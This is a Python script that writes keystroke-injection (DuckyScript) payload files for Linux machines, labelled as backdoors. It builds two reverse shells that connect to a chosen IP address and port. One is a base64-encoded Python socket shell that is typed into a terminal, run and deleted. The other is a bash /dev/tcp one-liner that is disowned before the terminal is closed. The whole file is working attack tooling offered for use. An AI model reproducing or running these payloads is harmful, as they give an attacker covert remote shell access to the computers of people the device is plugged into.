import base64, os



def initfile(filename): # init file to write
    with open(filename, 'w') as file:
        file.write("DELAY 250\n")
        file.write("CTRL ALT t\n")  # works for Debian (tested with Kali)
        file.write("DELAY 1000\n")
        


def reverseshellPython(IPaddr, Port):
    script = f"""import os, socket, subprocess, threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()
def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{IPaddr}", {Port}))
p = subprocess.Popen(["/bin/bash"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()
p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()
try:
    p.wait()
except KeyboardInterrupt:
    s.close()"""

    one = """echo '"""
    two = f"""' | base64 -d > temp_script.py && python3 temp_script.py && rm -f temp_script.py"""
    
    encoded = base64.b64encode(script.encode("utf-8")).decode("utf-8")

    with open("Backdoor_ReverseShellPython_Linux.txt", 'a') as file:
        file.write("STRING " + one + encoded + two)
        file.write("\nENTER")
        file.write("\nDELAY 2500")
        file.write("\nSTRING exit")
        file.write("\nENTER")


def reverseshell_bash(IPaddr, Port):
    script = f"""bash -c 'bash -i >& /dev/tcp/{IPaddr}/{Port} 0>&1 & disown' && exit"""
    
    with open("Backdoor_ReverseShellBash_Linux.txt", 'a') as file:
        file.write("STRING " + script)
        file.write("\nENTER")
        file.write("\nDELAY 2500")
        file.write("\nSTRING exit")
        file.write("\nENTER")